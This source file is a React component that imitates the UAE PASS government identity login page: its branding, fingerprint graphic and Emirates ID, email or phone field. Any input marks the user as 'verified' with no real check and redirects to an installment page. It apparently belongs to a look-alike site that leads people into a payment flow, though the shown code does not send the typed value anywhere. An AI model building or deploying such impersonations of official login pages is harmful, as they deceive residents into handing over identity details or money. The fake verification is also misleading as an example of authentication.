import React, { useState } from "react";
import { useLocation } from "wouter";

export default function UaePassLogin() {
  const [, setLocation] = useLocation();
  const [rememberMe, setRememberMe] = useState(false);
  const [inputValue, setInputValue] = useState("");

  const handleLogin = (e: React.FormEvent) => {
    e.preventDefault();
    localStorage.setItem("uaePassVerified", "true");
    setLocation("/installment-en");
  };

  return (
    <div style={{ minHeight: "100vh", backgroundColor: "#ffffff", display: "flex", flexDirection: "column" }}>
      {/* Green Top Bar */}
      <div style={{ height: "12px", backgroundColor: "#00a86b", width: "100%" }}></div>

      {/* Main Content */}
      <div style={{ flex: 1, display: "flex", flexDirection: "column", justifyContent: "center", alignItems: "center", padding: "60px 20px", backgroundColor: "#ffffff" }}>
        <div style={{ maxWidth: "500px", width: "100%" }}>
          {/* Fingerprint Icon - SVG */}
          <div style={{ textAlign: "center", marginBottom: "50px" }}>
            <svg width="100" height="100" viewBox="0 0 100 100" style={{ margin: "0 auto", animation: "spin 2s linear infinite" }}>
              <defs>
                <style>{`
                  @keyframes spin {
                    from { transform: rotate(0deg); }
                    to { transform: rotate(360deg); }
                  }
                  svg { transform-origin: center; }
                `}</style>
              </defs>
              
              {/* Outer dashed circle - Black */}
              <circle cx="50" cy="50" r="48" fill="none" stroke="#000000" strokeWidth="1.5" strokeDasharray="3,3" opacity="0.5" />
              
              {/* Outer dots - Black */}
              <circle cx="50" cy="6" r="1.5" fill="#000000" />
              <circle cx="80" cy="15" r="1.5" fill="#000000" />
              <circle cx="94" cy="50" r="1.5" fill="#000000" />
              <circle cx="80" cy="85" r="1.5" fill="#000000" />
              <circle cx="50" cy="94" r="1.5" fill="#000000" />
              <circle cx="20" cy="85" r="1.5" fill="#000000" />
              <circle cx="6" cy="50" r="1.5" fill="#000000" />
              <circle cx="20" cy="15" r="1.5" fill="#000000" />
              
              {/* Middle circle - Green */}
              <circle cx="50" cy="50" r="38" fill="none" stroke="#00a86b" strokeWidth="2.5" opacity="0.9" />
              
              {/* Inner circle - Green */}
              <circle cx="50" cy="50" r="28" fill="none" stroke="#00a86b" strokeWidth="1.5" opacity="0.7" />
              
              {/* Fingerprint spiral - Black outer */}
              <path d="M 50 18 Q 70 22 75 40 Q 78 60 65 78 Q 50 85 35 78 Q 22 60 25 40 Q 30 22 50 18" fill="none" stroke="#000000" strokeWidth="1.8" />
              <path d="M 50 28 Q 65 31 70 45 Q 72 58 62 72 Q 50 78 38 72 Q 30 58 32 45 Q 37 31 50 28" fill="none" stroke="#000000" strokeWidth="1.5" />
              
              {/* Fingerprint spiral - Green inner */}
              <path d="M 50 38 Q 62 40 68 52 Q 70 62 60 70 Q 50 75 40 70 Q 32 62 34 52 Q 40 40 50 38" fill="none" stroke="#00a86b" strokeWidth="1.8" />
              
              {/* Red accent dot */}
              <circle cx="72" cy="42" r="2.5" fill="#ff0000" />
            </svg>
          </div>

          {/* Title */}
          <h1 style={{ textAlign: "center", fontSize: "28px", fontWeight: "500", color: "#4a5568", marginBottom: "40px", margin: "0 0 40px 0", letterSpacing: "0.5px" }}>
            Login to UAE PASS
          </h1>

          {/* Form */}
          <form onSubmit={handleLogin} style={{ display: "flex", flexDirection: "column", gap: "20px" }}>
            {/* Input Field */}
            <input
              type="text"
              placeholder="Emirates ID, email, or phone eg. 971500000000"
              value={inputValue}
              onChange={(e) => setInputValue(e.target.value)}
              style={{
                width: "100%",
                padding: "16px 18px",
                border: "2px solid #d0d0d0",
                borderRadius: "12px",
                fontSize: "15px",
                boxSizing: "border-box",
                fontFamily: "Arial, sans-serif",
                color: "#666666",
                backgroundColor: "#ffffff",
                transition: "border-color 0.3s",
              }}
              onFocus={(e) => {
                e.target.style.borderColor = "#00a86b";
              }}
              onBlur={(e) => {
                e.target.style.borderColor = "#d0d0d0";
              }}
            />

            {/* Remember Me Checkbox */}
            <div style={{ display: "flex", alignItems: "center", gap: "10px" }}>
              <input
                type="checkbox"
                id="rememberMe"
                checked={rememberMe}
                onChange={(e) => setRememberMe(e.target.checked)}
                style={{
                  width: "20px",
                  height: "20px",
                  cursor: "pointer",
                  accentColor: "#0052cc",
                }}
              />
              <label htmlFor="rememberMe" style={{ fontSize: "15px", color: "#333333", cursor: "pointer", fontWeight: "500" }}>
                Remember me
              </label>
            </div>

            {/* Login Button */}
            <button
              type="submit"
              style={{
                width: "100%",
                padding: "16px",
                backgroundColor: "#5b6b8f",
                color: "#ffffff",
                border: "none",
                borderRadius: "12px",
                fontSize: "16px",
                fontWeight: "600",
                cursor: "pointer",
                marginTop: "10px",
                transition: "background-color 0.3s",
              }}
              onMouseOver={(e) => {
                e.currentTarget.style.backgroundColor = "#4a5a7f";
              }}
              onMouseOut={(e) => {
                e.currentTarget.style.backgroundColor = "#5b6b8f";
              }}
            >
              Login
            </button>
          </form>

          {/* Links */}
          <div style={{ textAlign: "center", marginTop: "30px", fontSize: "14px" }}>
            <span style={{ color: "#666666" }}>Don't have UAEPASS account? </span>
            <a href="#" style={{ color: "#00a86b", textDecoration: "none", fontWeight: "600", cursor: "pointer" }}>
              Create new account
            </a>
          </div>

          <div style={{ textAlign: "center", marginTop: "15px" }}>
            <a href="#" style={{ color: "#00a86b", textDecoration: "none", fontWeight: "600", fontSize: "14px", cursor: "pointer" }}>
              Recover your account
            </a>
          </div>
        </div>
      </div>
    </div>
  );
}
